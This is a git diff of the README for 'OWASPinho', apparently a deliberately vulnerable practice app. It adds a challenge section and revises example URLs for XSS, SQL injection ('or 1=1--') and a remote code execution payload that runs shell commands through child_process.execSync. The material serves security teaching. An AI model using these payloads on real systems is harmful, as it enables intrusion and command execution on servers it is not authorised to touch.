@@ -1,5 +1,6 @@
 # OWASPinho
 - [OWASPinho](#owaspinho)
+  - [Desafio](#desafio)
   - [Execução](#execução)
   - [Vulnerabilidades](#vulnerabilidades)
     - [XSS](#xss)
@@ -28,13 +29,13 @@ $ docker-compose up
 ## Vulnerabilidades 
 ### XSS
 ```
-/?useriInput=%3Cscript%3Ealert%281%29%3C%2Fscript%3E
+/?userInput=<script>alert(1)</script>
 ```
 ### SQL Injection
 ```
-/users?username=OR+1=1--&access-token=ASDASD
+/users?username='+or+1=1--&access-token=' 
 ```
 ### RCE
 ```
-/users/has-access?userId=1&resourceId=42&userAccessCheck=function(userId,%20resourceId)%20{%20return%20require('child_process').execSync('ls').toString();%20}
+/users/has-access?userId=1&resourceId=42&userAccessCheck=function(userId,%20resourceId)%20{%20return%20require('child_process').execSync('ping+-c+4+localhost').toString();%20}
 ```
